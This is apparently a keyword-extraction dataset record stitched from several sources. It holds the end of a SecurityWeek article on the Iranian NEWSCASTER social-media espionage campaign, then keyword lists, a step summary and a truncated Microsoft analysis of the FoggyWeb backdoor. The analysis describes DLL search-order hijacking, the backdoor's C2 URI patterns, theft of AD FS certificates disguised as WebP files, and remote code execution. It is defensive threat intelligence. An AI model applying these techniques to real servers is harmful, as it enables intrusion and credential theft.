intelligence firm says that what this group lacks in technical sophistication they make up for in brashness, creativity, and patience.Working undetected since 2011, iSIGHT Partners said targets included senior U.S. military and diplomatic personnel, congressional personnel, Washington D.C. area journalists, U.S. think tanks, defense contractors in the U.S. and Israel.Other victims targeted were in the U.K., Saudi Arabia, Iraq and also included vocal supporters of Israel.“Though it is possible anyone connected to the network was compromised, deliberate attempts to connect with certain entities suggest an interest in political, military, diplomatic and technical intelligence,” the closely held report said.“Largely this campaign was about credential harvesting and recon,” Stephen Ward, Senior Director of Marketing at iSIGHT Partners, told SecurityWeek.“They are using those connections to harvest connections to corporate email, harvest connections to personal email, and use those springboards for further lateral [movement], “ he said.After making connections on social networks, targets were sent spear‐phishing messages, often with links asking recipients to log‐in to fake pages in order to capture credentials.Below is a list of some of the accounts/fake personas allegedly used by the attackers.The campaign also leveraged malware, and while the malware used was not particularly sophisticated, it does includes the capability to exfiltrate data.urlﬁcials-elaborate-social-media-attack-operation3/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.Com“They are sort of disadvantaged from a technological advancement side of things,” Ward said, referring to assumed Irianian attackers. “They have taken to the cyber world the same way you can compare the impact of [improvised explosive devices]. The approach is low cost and does not really use a lot of sophistication from an exploit perspective, but is very effective and ultimately a bit more under the radar.”“Adversaries such as these are increasingly adept at finding and exploiting opportunities to carry out cyber espionage, even when lacking sophisticated capability,” iSIGHT Partners concluded. “NEWSCASTER’s success is largely due to its patience, brazen nature, and innovative use of multiple social media platforms.”Organizations involved in critical infrastructure, or who have information that may be of strategic or tactical interest to a nation‐state adversary should be concerned about a threat such as this, iSIGHT Partners warned.We are protective of sources and methods, but we can confirm that these actors did not go unnoticed by some targeted entities and they left significant evidence of their activity throughout the Internet.Attribution to IranAccording to iSIGHT Partners, there is no direct information showing that the Iranian government is the ultimate sponsor of the campaign, but iSIGH researchers do believe the threat actors are located in Iran.“[The attackers] maintained a regular schedule, including what appears to be a lengthy lunch break followed by the remainder of the work day,” the report said. “These hours conform to work hours in Tehran. Furthermore, the operators work half the day on Thursday and rarely work on Friday, the Iranian weekend.”Additional clues, such as the targets the attackers selected, along with additional technical indicators, sparked iSIGHT to believe NEWSCASTER stems from Iran.iSIGHT Partners said it did coordinate with the FBI to brief government agencies and also notified Facebook, LinkedIn and other social networks.According to Ward, the identified malicious personas have been removed from Facebook and LinkedIn.The report from iSIGHT Partners comes roughly two weeks after a report from FireEye, which suggested that Iranian attackers’ methodologies have “grown more consistent with other advanced persistent threat (APT) actors in and around Iran"" following cyber attacks against Iran in the late 2000s.“Iran has steadily increased their focus on cyber espionage over the years, placing significant emphasis on enhancing capabilities following the Stuxnet attacks,” Michael Sutton, VP of Security Research for Zscaler, told SecurityWeek. “The NEWSCASTER attacks, while not technically sophisticated were allegedly quite successful. Often social engineering can be the most powerful tool in an attacker's arsenal.”Social networks are a significant challenge for security teams, Sutton says.“They generally represent a personal communication medium which the organization does not have direct control over and yet can become a source of leaked data or a catalyst for attack as has been seen in the NEWSCASTER attacks. Moreover, due to password reuse, even if an attacker can gain access to credentials used by a victim on personal accounts, there is a string likelihood that the same credentials have also been used for more sensitive corporate accounts.""urlﬁcials-elaborate-social-media-attack-operation4/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.Com""The campaign reported by iSightPartners uncovers what we have known for the last decade ‐‐ that sophisticated hackers backed by nation states target the weakest link on networks ‐‐ the user with relatively unsophisticated techniques including spear phishing and social media,” Anup Ghosh, founder and CEO of Invincea, told SecurityWeek.“Using social media is both a way of establishing false bona fides while presenting a well accepted vector for reaching targets,” Ghosh continued. “A simple LinkedIn or Twitter update with a link, or a timely email from a connection with embedded link or attachment is enough to compromise the intended target's machine, accounts, data, and enterprise network.”""This is not surprising as every major foreign adversary is leveraging social media as a cyber attack vector,” added James C. Foster, CEO of ZeroFOX. “Our government realizes this threat is increasing and social media is being used for target reconnaissance and exploitation.”Listen to the Podcast: Inside the 'NEWSCASTER' Cyber Espionage CampaignRelated Reading: Social Media a Key Element for Terror GroupsRelated Reading: News Junkies Make Great TargetsShare801TweetRecommend41For more than 10 years, Mike Lennon has been closely monitoring and analyzing trends in the enterprise IT security space and the threat landscape. In his role at SecurityWeek he oversees the editorial direction of the publication and manages several leading security conferences. Previous Columns by Mike Lennon: Darktrace Raises $65 Million in Round Led By KKR Hard Rock Hotel & Casino Hit By PoS Malware Symantec to Acquire Blue Coat for $4.65 Billion Symantec Wants to Protect Your Car From Zero-Day Attacks Morgan Stanley to Pay $1 Million Penalty Over Customer Data Theft 2016 ICS Cyber Security Conference - Atlanta, GA [Oct 24-27]sponsored linksView Our Library of on Demand Security WebcastsDownload Free Security Resources from the SecurityWeek White Paper LibraryVisit The RSA Advanced Security Operations Resource CenterTags: Cyberwarfare NEWS & INDUSTRY Malware Cybercrimeurlﬁcials-elaborate-social-media-attack-operation5/92016/7/7 0 CommentsIranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComSecurityWeek provides information security news and analysis.RecommendShare⤤Start the discussion…Login1 Sort by BestBe the ﬁrst to comment.ALSO ON SECURITYWEEK PROVIDES INFORMATION SECURITY NEWS AND ANALYSIS. Yahoo Rewards Researcher for ImageMagick Hack 1 comment • 2 months ago•Mysteries of the Panama Papers 1 comment • 2 months ago•David Boccabella — I know of one major site that has been hit by this. It's forum source code (Proprietary) was downloaded and …Will Liu — ICIJ- look at the dns records! =)Hacked WordPress Sites Target Random Users 1 comment • 2 months ago•Dan Awontis — Wow, that's a huge number of attacks. Very informative article, worth reading.New Tools Disguised as Old Malware in Hospital Attacks 1 comment • 10 days ago•Mike Mastela — Patching and vulnerability remediation must move beyond the servers and traditional endpoints and include …Subscribe✉Add Disqus to your site Add Disqus Addd SearchPrivacy Subscribe to SecurityWeekEnter Your Email AddressSubscribeurlﬁcials-elaborate-social-media-attack-operation6/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComMost Recent Most ReadNeutrino, RIG Using Blackhat-TDS for Redirection Businesses in the Dark on Value of Corporate Data Israeli Ad Company Behind ""Pirrit"" OS X Adware: Report Hadoop Audit and Logging ""Back in Time"" OS X Backdoor Provides Unfettered Access to Mac Systems Darktrace Raises $65 Million in Round Led By KKR Microsoft Proposes Independent Body to Attribute Cyber Attacks Information-Collecting Android Keyboard Tops 50 Million Installs EU Invests €450 Million in Cybersecurity Partnership SBDH Espionage Toolkit Used to Target European GovernmentsDiscussionPeople Recent PopularRecent Commentsurlﬁcials-elaborate-social-media-attack-operation7/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComChuck Parks (OnesnZero's)Very good information & no shortage of these to be on guard for! Thank you Satana Ransomware Encrypts MBR and Files · 1 day agoJeff SilvermanDavid, This problem is nothing new. A friend of mine was working at a shop that still used SNMP v2 because some of their devices couldn't handle SNMP v3. They weren't willing to keep track of which New X25519 Cipher Throws Enterprise Surveillance for a Loop · 2 days agoCrissaThe needs and security measures - what devices are being integrated with - will differ substantially between employees and customers. The Great Analyst Debate Over Consumer IAM · 2 days agoPopular TopicsInformation Security News IT Security News Smart Device SecuritySecurity CommunityIT Security Newsletters Suits and Spooks ICS Cyber Security Conference CISO Forum InfosecIsland.ComStay IntouchTwitter Facebook LinkedIn Groupurlﬁcials-elaborate-social-media-attack-operation8/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComCyber Weapon Discussion Group Security Intelligence GroupAbout SecurityWeekTeam Contact UsCopyright © 2016 Wired Business Media. All Rights Reserved. Privacy Policy | Terms of Useurlﬁcials-elaborate-social-media-attack-operation9/9 ","{'phrases': ['Hackers', 'fake personas', 'social media platforms', 'Facebook', 'Twitter', 'LinkedIn', 'Files', 'targets', 'connections', 'users', 'links', 'credentials', 'fake pages', 'data', 'the malware', 'access', 'accounts', 'social engineering', '2011', 'Technical indicators', 'Iranian threat actors'], 'target': 'Hackers; fake personas; social media platforms; Facebook; Twitter; LinkedIn; Files; targets; connections; users; links; credentials; fake pages; data; the malware; access; accounts; social engineering; 2011; Technical indicators; Iranian threat actors.'}"
NOBELIUM malware; credential theft; credentials; a server; persistence; use; the backdoor; credentials; tools; persistence; RAT; hives; the infected system; additional components; Steal; icloud; persistence; Reconnaissance; data; compromised AD FS servers.,[' 1. NOBELIUM gains admin access to an AD FS server. 2. They drop a malicious DLL loader and encrypted backdoor DLL. 3. The loader hijacks DLL search order to execute instead of the legitimate DLL. 4. It decrypts and loads the backdoor DLL into the AD FS service process. 5. The backdoor sets up HTTP listeners for specific URI patterns as commands. 6. Commands exfiltrate the AD FS certificates and configuration database. 7. Commands can also download and execute assemblies or source code. 8. The backdoor leverages AD FS APIs to retrieve and decrypt certificates. 9. Exfiltrated data is concealed as fake image files before sending to attacker. 10. The backdoor provides persistent access and monitoring of the AD FS server. '],"Extract the keywords: 9/28/21, 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoormicrosoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoorSeptember 27, 2021Microsoft continues to work with partners and customers to track and expand our knowledge of the threat actor we refer to as NOBELIUM, the actor behind the SUNBURST backdoor, TEARDROP malware, and related components. As we stated before, we suspect that NOBELIUM can draw from significant operational resources often showcased in their campaigns, including custom-built malware and tools. In March 2021, we profiled NOBELIUM’s GoldMax, GoldFinder, and Sibot malware, which it uses for layered persistence. We then followed that up with another post in May, when we analyzed the actor’s early-stage toolset comprising EnvyScout, BoomBox, NativeZone, and VaporRage.This blog is another in-depth analysis of newly detected NOBELIUM malware: a post-exploitation backdoor that Microsoft Threat Intelligence Center (MSTIC) refers to as FoggyWeb. As mentioned in previous blogs, NOBELIUM employs multiple tactics to pursue credential theft with the objective of gaining admin-level access to Active Directory Federation Services (AD FS) servers. Once NOBELIUM obtains credentials and successfully compromises a server, the actor relies on that access to maintain persistence and deepen its infiltration using sophisticated malware and tools. NOBELIUM uses FoggyWeb to remotely exfiltrate the configuration database of compromised AD FS servers, decrypted token-signing certificate, and token-decryption certificate, as well as to download and execute additional components. Use of FoggyWeb has been observed in the wild as early as April 2021.Microsoft has notified all customers observed being targeted or compromised by this activity. If you believe your organization has been compromised, we recommend that youAudit your on-premises and cloud infrastructure, including configuration, per-user and per-app settings, forwarding rules, and other changes the actor might have made to maintain their access Remove user and app access, review configurations for each, and re-issue new, strong credentials following documented industry best practices. Use a hardware security module (HSM) as described in securing AD FS servers to prevent the exfiltration of secrets by FoggyWeb.Microsoft security products have implemented detections and protections against this malware. Indicators of compromise (IOCs), mitigation guidance, detection details, and hunting queries for Azure Sentinel and Microsoft 365 Defender customers are provided at the end of this analysis and in the product portals. Active Directory Federation Services (AD FS) servers run on-premises and customers can also follow detailed guidance on securing AD FS servers against attacks.FoggyWeb: Backdoor targeting AD FSFoggyWeb is a passive and highly targeted backdoor capable of remotely exfiltrating sensitive information from a compromised AD FS server. It can also receive additional malicious components from a command-and-control (C2) server and execute them on the compromised server.After compromising an AD FS server, NOBELIUM was observed dropping the following two files on the system (administrative privileges are required to write these files to the folders listed below):%WinDir%\ADFS\version.dll %WinDir%\SystemResources\Windows.Data.TimeZones\pris\Windows.Data.TimeZones.zh- PH.priurl 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogFoggyWeb is stored in the encrypted file Windows.Data.TimeZones.zh-PH.pri, while the malicious file version.dll can be described as its loader. The AD FS service executable Microsoft.IdentityServer.ServiceHost.exe loads the said DLL file via the DLL search order hijacking technique that involves the core Common Language Runtime (CLR) DLL files (described in detail in the FoggyWeb loader section). This loader is responsible for loading the encrypted FoggyWeb backdoor file and utilizing a custom Lightweight Encryption Algorithm (LEA) routine to decrypt the backdoor in memory.After de-obfuscating the backdoor, the loader proceeds to load FoggyWeb in the execution context of the AD FS application. The loader, an unmanaged application, leverages the CLR hosting interfaces and APIs to load the backdoor, a managed DLL, in the same Application Domain within which the legitimate AD FS managed code is executed. This grants the backdoor access to the AD FS codebase and resources, including the AD FS configuration database (as it inherits the AD FS service account permissions required to access the configuration database).When loaded, the FoggyWeb backdoor (originally named Microsoft.IdentityServer.WebExtension.dll by its developer) functions as a passive and persistent backdoor that allows abuse of the Security Assertion Markup Language (SAML) token. The backdoor configures HTTP listeners for actor-defined URIs that mimic the structure of the legitimate URIs used by the target’s AD FS deployment. The custom listeners passively monitor all incoming HTTP GET and POST requests sent to the AD FS server from the intranet/internet and intercept HTTP requests that match the custom URI patterns defined by the actor. This version of FoggyWeb configures listeners for the following hardcoded URI patterns (which might vary per target):HTTP GET URI pattern:/adfs/portal/images/theme/light01/profile.webp /adfs/portal/images/theme/light01/background.webp /adfs/portal/images/theme/light01/logo.webpHTTP POST URI pattern:/adfs/services/trust/2005/samlmixed/uploadEach HTTP GET/POST URI pattern above corresponds to a C2 command:url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogWhen the AD FS server receives an HTTP GET request containing the URI pattern /adfs/portal/images/theme/light01/profile.webp, the backdoor retrieves the token signing certificate of the compromised AD FS server and then obfuscates and returns the certificate to the issuer of the request. Similarly, when the AD FS server receives an HTTP GET request containing the URI pattern /adfs/portal/images/theme/light01/background.webp, the backdoor retrieves the token decryption certificate of the compromised AD FS server and then obfuscates and returns the certificate to the issuer of the request. When the AD FS server receives an HTTP GET request containing the URI pattern /adfs/portal/images/theme/light01/logo.webp, the backdoor retrieves the AD FS configuration data of the compromised server, obfuscates the data, and returns the obfuscated data to the issuer of the request. When the AD FS server receives an HTTP POST request containing the URI pattern /adfs/services/trust/2005/samlmixed/upload, the backdoor treats the obfuscated and compressed POST data as either .NET assembly or source code. If assembly, the backdoor executes the assembly in the execution context of the AD FS process. If source code, the backdoor dynamically compiles the source code and proceeds to execute the resulting memory-resident assembly in the execution context of the AD FS process.The diagram below illustrates the methodology used by the actor to communicate with the FoggyWeb backdoor located on a compromised internet-facing AD FS server.Since FoggyWeb runs in the context of the main AD FS process, it inherits the AD FS service account permissions required to access the AD FS configuration database. This contrasts with tools such as ADFSDump that must be executed under the user context of the AD FS service account. Also, because FoggyWeb is loaded into the same application domain as the AD FS managed code, it gains programmatical access to the legitimate AD FS classes, methods, properties, fields, objects, and components that are subsequently leveraged by FoggyWeb to facilitate its malicious operations. For example, this allows FoggyWeb to gain access to the AD FS configuration data without connecting to the WID named pipe or manually running SQL queries to retrieve configuration information (for example, to obtain the EncryptedPfx blob from the configuration data). FoggyWeb is also AD FS version-agnostic; it does not need to keep track of legacy versus modern configuration table names and schemas, named pipe names, and other version-dependent properties of AD FS.FoggyWeb loaderurl 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe file version.dll is a malicious loader responsible for loading an encrypted backdoor file from the file system, decrypting the backdoor file, and loading it in memory. This malicious DLL, which shares a name with a legitimate Windows DLL located in the %WinDir%\System32\ folder, is meant to be placed in the main AD FS folder %WinDir%\ADFS\, where the AD FS service executable Microsoft.IdentityServer.ServiceHost.exe is located (for reasons described later in this section).When the AD FS service (adfssrv) is started, the service executable Microsoft.IdentityServer.ServiceHost.exe gets executed. As a .NET-based managed application, Microsoft.IdentityServer.ServiceHost.exe imports an unmanaged Windows DLL named mscoree.dll.The file mscoree.dll dynamically loads another unmanaged Windows/CLR DLL named mscoreei.dll. As shown below, mscoreei.dll has a delay load import (Delay Import) named version.dll.NOBELIUM, with existing administrative permissions, was observed to drop a malicious loader named version.dll in the %WinDir%\ADFS\ folder where the AD FS service executable Microsoft.IdentityServer.ServiceHost.exe is located. Once the system or the AD FS service is restarted, Microsoft.IdentityServer.ServiceHost.exe loads mscoree.dll, which in turn loads mscoreei.dll. As mentioned above, mscoreei.dll has a delay load import named version.dll. Once loaded, instead of loading the legitimate version.dll from the %WinDir%\System32\ folder mscoreei.dll loads the malicious version.dll planted by the attacker in %WinDir%\ADFS\ folder (referred to as DLL search order hijacking), as shown in the call stack below.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe malicious loader version.dll behaves as a proxy for all legitimate version.dll export function calls. As shown below, it exports the same 17 function names as the legitimate version of version.dll.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe export functions of the malicious version.dll are all short stubs that call a single trampoline function labeled TrampolineFunction, as seen in the screenshot below.Below is a pseudocode for the trampoline function.This trampoline function is responsible for the following:Calling a function (labeled as LoadDecryptExecuteBackdoor() by the analyst) to load a backdoor file from the file system, and then decrypting and executing the file in memory Transferring execution to the initially called target function from the legitimate version of version.dll.The trampoline function preserves the value of the arguments/registers intended for the function from the legitimate version of version.dll by saving the value of certain CPU registers. It first pushes them onto the stack before calling the LoadDecryptExecuteBackdoor() function above and then restoring them before transferring execution to the function from the legitimate version of version.dll.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogWhen called, LoadDecryptExecuteBackdoor() attempts to create a Windows event named {2783c149-77a7-5e51- 0d83-ac0566daff96} to ensure that only one copy of the loader is actively running on the system. In a new thread, it then checks if the following file is present (hardcoded path string):C:\Windows\SystemResources\Windows.Data.TimeZones\pris\Windows.Data.TimeZones.zh-PH.priWindows.Data.TimeZones.zh-PH.pri is an encrypted backdoor file that is placed in the folder above. MSTIC refers to this backdoor file as FoggyWeb, and our analysis is in the next section.Microsoft.IdentityServer.ServiceHost.exe in and of itself is an unmanaged Windows executable that is generated when the high-level AD FS managed code is compiled. When executed, the unmanaged code inside Microsoft.IdentityServer.ServiceHost.exe leverages Common Language Runtime (CLR) to run the managed AD FS code within a virtual runtime environment. This virtual runtime environment is comprised of one or more application domains, which provide a unit of isolation for the runtime environment and allow different applications to run inside separate containers within a process. The managed AD FS code is executed within an application domain inside the virtual runtime environment.The FoggyWeb backdoor (also a managed DLL) is intended to run alongside the legitimate AD FS code (that is, within the same application domain). This means that for the FoggyWeb loader to load the backdoor alongside the AD FS code, it needs to gain access to the same application domain that the AD FS code is executed within. Since the FoggyWeb loader version.dll is an unmanaged application, it cannot directly access the virtual runtime environment that the managed AD FS code is executed within. The loader overcomes this limitation and loads the backdoor alongside the AD FS code by leveraging the CLR hosting interfaces and APIs to access the virtual runtime environment within which the AD FS code is executed.The loader performs the following high-level actions:Enumerate all CLRs loaded in the AD FS process Microsoft.IdentityServer.ServiceHost.exe For each CLR, enumerate all running application domains and perform the following actions for each domain:Read the contents of the following encrypted FoggyWeb backdoor file into memory: C:\Windows\SystemResources\Windows.Data.TimeZones\pris\Windows.Data.TimeZones.zh- PH.pri Decrypt the encrypted FoggyWeb backdoor file using the Lightweight Encryption Algorithm (LEA). The LEA-128 key schedule uses the following hardcoded master key to generate the round keys:url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogAfter decrypting each 16-byte cipher block, the loader uses the following XOR key to decode each individual decrypted/plaintext block:This is equivalent to first LEA decrypting the entire file and then XOR decoding the decrypted data (instead of decrypting and XOR decoding each individual 16-byte block).Create a Safe Array and copy the decrypted FoggyWeb backdoor bytes to the array. It then calls the Load() function for the current application domain to load the FoggyWeb DLL into the application domain. After the FoggyWeb DLL is loaded into the current application domain, the loader invokes the following method from the DLL: Microsoft.IdentityServer.WebExtension.WebHost.At this point in the execution cycle, the FoggyWeb DLL is loaded into one or more application domains where the legitimate AD FS code is running. This means the backdoor code runs alongside the AD FS code with the same access and permissions as the AD FS application. Because the backdoor is loaded in the same application domain as the AD FS code, it gains programmatical access to the legitimate classes, methods, properties, fields, objects, and components used by various AD FS modules to carry out their legitimate functionality. Such access allows the FoggyWeb backdoor to directly interact with the AD FS codebase (that is, not an external disk-resident tool) and selectively invoke native AD FS methods needed to facilitate its malicious operations.FoggyWeb backdoorThis malicious memory-resident DLL (originally named Microsoft.IdentityServer.WebExtension.dll by its developer) functions as a backdoor targeting AD FS. It is loaded by the main AD FS service process Microsoft.IdentityServer.ServiceHost.exe through a malicious loader component.When loaded, the backdoor starts an HTTP listener that listens for HTTP GET and POST requests containing the following URI patterns:HTTP GET URI pattern: /adfs/portal/images/theme/light01/ HTTP POST URI pattern: /adfs/services/trust/2005/samlmixed/uploadAs shown below, the URI patterns are hardcoded in the backdoor and mimic the structure of the legitimate URIs used by the target’s AD FS deployment.Once the backdoor receives an HTTP request that contains one of the URI patterns above, the listener proceeds to handle the request using either an HTTP GET or HTTP POST callback/handler method (ProcessGetRequest() and ProcessGetRequest(), respectively).url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogHTTP GET handlerThe incoming HTTP GET requests that contain the URI pattern /adfs/portal/images/theme/light01/ are handled by backdoor’s ProcessGetRequest() method.If an incoming HTTP GET request is issued for a file/resource with the file extension of .webp, the ProcessGetRequest() method proceeds to handle the request. Otherwise, the request is ignored by the backdoor. Also, if the requested file name matches one of the three hardcoded names below, the backdoor treats the request as a C2 command issued by the attacker.The following URL patterns are treated as C2 commands:/adfs/portal/images/theme/light01/profile.webp /adfs/portal/images/theme/light01/background.webp /adfs/portal/images/theme/light01/logo.webpurl 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe first two C2 commands, profile.webp and background.webp (UrlGetFileNames[0] and UrlGetFileNames[1] in the screenshot above), are handled by calling the backdoor’s Service.GetCertificate() method.As the name suggests, this method is responsible for retrieving an AD FS certificate (either the token- signing or the token encryption certificate, depending on the value of the certificateType parameter passed to the method) from the AD FS service configuration database.Analyst note: Refer to the Appendix for an in-depth analysis of the Service.GetCertificate() method and how it obtains and decrypts either the token signing or encryption certificate.As shown in the screenshot above, when the C2 command profile.webp (UrlGetFileNames[0]) is issued to the backdoor (by issuing an HTTP GET request for the URI /adfs/portal/images/theme/light01/profile.webp), the backdoor retrieves the token-signing certificate of the compromised AD FS server. Similarly, when the C2 command background.webp (UrlGetFileNames[1]) is issued to the backdoor (by issuing an HTTP GET request for the URI /adfs/portal/images/theme/light01/background.webp), the backdoor retrieves the token encryption certificate of the compromised AD FS server.The third C2 command, logo.webp (UrlGetFileNames[2]), is triggered by sending an HTTP GET request to the following URI: /adfs/portal/images/theme/light01/logo.webp. The C2 command is handled by calling the backdoor’s GetInfo() method.The GetInfo() method is responsible for dumping the AD FS service configuration data of the compromised server.As shown above, the AD FS service configuration data is obtained via the ServiceSettingsData property, which retrieves the data from the AD FS service configuration database, Windows Internal Database (WID).Before returning the output of the C2 commands (that is, the token-signing certificate, the token encryption certificate, or the AD FS service configuration data) to the C2 in an HTTP 200 response, the backdoor first obfuscates the output by calling its method named GetWebpImage().url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe GetWebpImage() method is in charge of masquerading the output of the C2 commands as a legitimate WebP file (by adding appropriate RIFF/WebP file header magic/fields) and encoding the resulting WebP file.GetWebpImage() uses the following helper methods to create and encode the fake WebP file that contains the C2 command output:GetWebpImage() first invokes the Webp.GetFrame() method, which is responsible for compressing the output of the C2 command and copying the compressed version to a new array (0 padded to a multiple of 32 bytes). The length of the compressed data is added as the first four bytes of the new array.To compress the data, GetFrame() invokes the Common.Compress() method, which is used to compress the data by leveraging the C# GZipStream compression class.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogFor demonstration purposes, assume the C2 command yields the following data (a 256-byte pseudo- randomly generated byte array).Given the data above (that is, sample C2 command output), GetFrame() returns the following byte array.Next, GetWebpImage() invokes the Webp.GetWebpHeader() method, passing in the size of the byte array returned by GetFrame() in the step above. GetWebpHeader() is responsible for creating and returning an array containing custom RIFF WebP file magic/header bytes.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe array variable above contains the following 32-byte hardcoded RIFF/WebP header bytes.If the size of the array passed to GetWebpHeader() (returned by GetFrame()) exceeds 8,192 bytes, the bytes at index 26 and 28 of the header bytes (initially set to 0x00) are replaced with 0x80. Otherwise, the bytes at index 26 and 28 are replaced with 0x40, as shown below.GetWebpHeader() then returns the custom RIFF/WebP header above to GetWebpImage().Next, GetWebpImage() creates a new array by appending the custom RIFF/WebP header bytes returned by GetWebpHeader() to the array returned by GetFrame() (the array containing the compressed version of the C2 command output).url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogGetWebpImage() calls the Common.ProtectData() method of the backdoor to encode the portion of the new array that contains the compressed bytes (that is, it does not encode the custom RIFF/WebP header). As the second argument, GetWebpImage() passes the offset of the first compressed byte to ProtectData() (as shown in the table above, 0x20 or 32 is the offset of the first compressed byte in this case). ProtectData() uses a dynamic XOR key and a custom XOR methodology to XOR encode the compressed data.Initially, the 12-byte hardcoded XOR key array contains the following (seed) bytes.As shown in the screenshot above, each byte of compressed data is XOR’d with a byte from the XOR key array. The first byte of the compressed data (0x17) is XOR’d with the XOR key byte located at offset 8 of the key array (0x77).After XOR’ing the first byte of the compressed data with the XOR key byte located at offset 8 of the key array, the XOR key byte itself gets overwritten with a new value.For example, the XOR key byte located at offset 8 of the XOR key array (0x77) gets overwritten with 0xEE via the following operations.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThe second byte of the compressed data (0x01) is XOR’d with the XOR key byte located at offset 9 of the key array (33 % 12 = 9) and so on until the key rolls to the first byte of the XOR array (as mentioned above, the XOR key bytes get overwritten after each encoding operation). Below is the XOR encoded version of the sample compressed array.After the steps outlined above, GetWebpImage() returns the following sample data to the method that invokes it to obfuscate and conceal the output of each C2 command (ProcessGetRequest()).As previously mentioned, ProcessGetRequest() returns the fake RIFF/WebP file generated above (containing stolen token-signing certificate, token encryption certificate, or the AD FS service configuration data) to the C2 in an HTTP 200 response.If the backdoor cannot execute a C2 command successfully, it returns an HTTP 404 response to the C2 instead.HTTP POST handlerIncoming HTTP POST requests that match the URI pattern /adfs/services/trust/2005/samlmixed/upload are handled by the ProcessPostRequest() method.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogThis method ensures that the ContentType value of an incoming HTTP POST request ends with “xml” (case-insensitive), and the HTTP POST data contains two XML elements named X509Certificate and SignatureValue (for example, a blob that starts with the string “<X509Certificate>” and ends with the string “</X509Certificate>”).If the XML data contains the two elements, the backdoor performs the following actions:Decode the values of the SignatureValue and X509Certificate elements by first decoding the values using Base64 and then calling the Common.UprotectData() method on each decoded value.The UprotectData() method treats the first two bytes of the Base64 decoded value as a two-byte XOR key. It invokes the Common.ProtectData() method (covered in the previous section) on the rest of the data (that is, third byte on) and then uses the two-byte XOR key to XOR decode the data returned byurl 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogCommon.ProtectData(). In other words, UprotectData() leverages Common.ProtectData() to remove the first layer of XOR encoding and then another XOR routine to remove the second layer of XOR encoding applied to the data.Invoke the Service.ExecuteAssembly() method to handle the decoded SignatureValue and X509Certificate values. As shown below, the decoded X509Certificate value is the first GZip decompressed/inflated by calling the Common.Decompress() method.In a new thread, Service.ExecuteAssembly() calls Service.ExecuteAssemblyRoutine() method to handle the data.ExecuteAssemblyRoutine() checks if the decoded X509Certificate value starts with “MZ” (or the bytes 0x4D 0x5A, the hexadecimal representation of the decimal numbers 77 and 90, as seen in the screenshot below).url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogIf the decoded X509Certificate value starts with “MZ,” the backdoor treats the decoded data as a .NET-based assembly/payload and proceeds to call its Service.ExecuteBinary() method to load and execute the DLL payload in memory. After loading the DLL in memory, ExecuteBinary() proceeds to invoke a specific method from the loaded DLL. The method name and parameters needed to invoke the method are supplied to the backdoor within the decoded SignatureValue data.If the decoded X509Certificate value does not start with MZ, the backdoor treats the decoded X509Certificate value as source code for a C#-based payload and calls its Service.ExecuteSource() method to dynamically compile and execute the payload in memory.After handling the HTTP POST request containing the XML elements X509Certificate and SignatureValue, the backdoor responds to the request with an HTTP 204 response code. If the HTTP POST does not have the elements mentioned above, the backdoor responds to the request with an HTTP 404 response code.Appendix: Obtaining and decrypting AD FS tokensAs the name suggests, the Service.GetCertificate() method is responsible for retrieving an AD FS certificate (either the token- signing or the token encryption certificate, depending on the value of the certificateType parameter passed to the method) from the AD FS service configuration database.The method performs the following actions to retrieve the desired certificate:url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor | Microsoft Security BlogInvoke another one of its methods named GetServiceSettingsDataProvider() to create an instance of type Microsoft.IdentityServer.PolicyModel.Configuration.ServiceSettingsDataProvider from the already loaded assembly Microsoft.IdentityServer.Invoke the GetServiceSettings() member/method of the above ServiceSettingsDataProvider instance to obtain the AD FS service configuration settings.Obtain the value of the AD FS service settings (from the SecurityTokenService property), extract the value of the EncryptedPfx blob from the service settings, and decode the blob using Base64.Invoke another method named GetAssemblyByName() to enumerate all loaded assemblies by name and locate the already loaded assembly Microsoft.IdentityServer.Service. This method retrieves the value of two fields named _state and _certificateProtector from an object of type Microsoft.IdentityServer.Service.Configuration.AdministrationServiceState (from the Microsoft.IdentityServer.Service assembly).The AdministrationServiceState class/object contains configuration information necessary for the execution and handling of client requests. The field _state is used to maintain the current state of the AdministrationServiceState class/object (screenshot from Microsoft.IdentityServer.Service.dll).The AdministrationServiceState object (stored in the _state field) contains another field named _certificateProtector.url 4:23 PMFoggyWeb: Targeted NOBELIUM malware leads to 